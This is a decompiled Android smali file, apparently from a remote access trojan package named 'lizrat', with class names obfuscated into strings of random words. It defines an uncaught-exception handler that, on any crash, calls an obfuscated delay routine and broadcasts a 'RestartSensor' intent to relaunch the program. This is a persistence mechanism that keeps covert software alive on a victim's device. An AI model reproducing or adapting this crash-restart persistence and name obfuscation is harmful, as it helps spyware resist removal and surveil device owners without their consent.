.class public LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$MyExceptionHandler;
.super Ljava/lang/Object;
.source "resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10.java"

# interfaces
.implements Ljava/lang/Thread$UncaughtExceptionHandler;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation


# instance fields
.field private final myActivityClass:Ljava/lang/Class;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation
.end field

.field private final myContext:Landroid/content/Context;

.field final synthetic this$0:LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;


# direct methods
.method public constructor <init>(LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;Landroid/content/Context;Ljava/lang/Class;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ljava/lang/Class<",
            "*>;)V"
        }
    .end annotation

    .line 162
    iput-object p1, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$MyExceptionHandler;->this$0:LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 163
    iput-object p2, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$MyExceptionHandler;->myContext:Landroid/content/Context;

    .line 164
    iput-object p3, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$MyExceptionHandler;->myActivityClass:Ljava/lang/Class;

    return-void
.end method


# virtual methods
.method public uncaughtException(Ljava/lang/Thread;Ljava/lang/Throwable;)V
    .locals 2

    .line 170
    :try_start_0
    iget-object p1, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$MyExceptionHandler;->myContext:Landroid/content/Context;

    const-string p2, "Error"

    const-wide/32 v0, 0x2bf20

    invoke-static {p1, p2, v0, v1}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V

    .line 172
    iget-object p1, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$MyExceptionHandler;->this$0:LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;

    new-instance p2, Landroid/content/Intent;

    iget-object v0, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$MyExceptionHandler;->this$0:LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;

    invoke-virtual {v0}, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, LLiz0rd/lizrat/SensorRestarterBroadcastReceiver;

    invoke-direct {p2, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "RestartSensor"

    invoke-virtual {p2, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p2

    invoke-virtual {p1, p2}, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
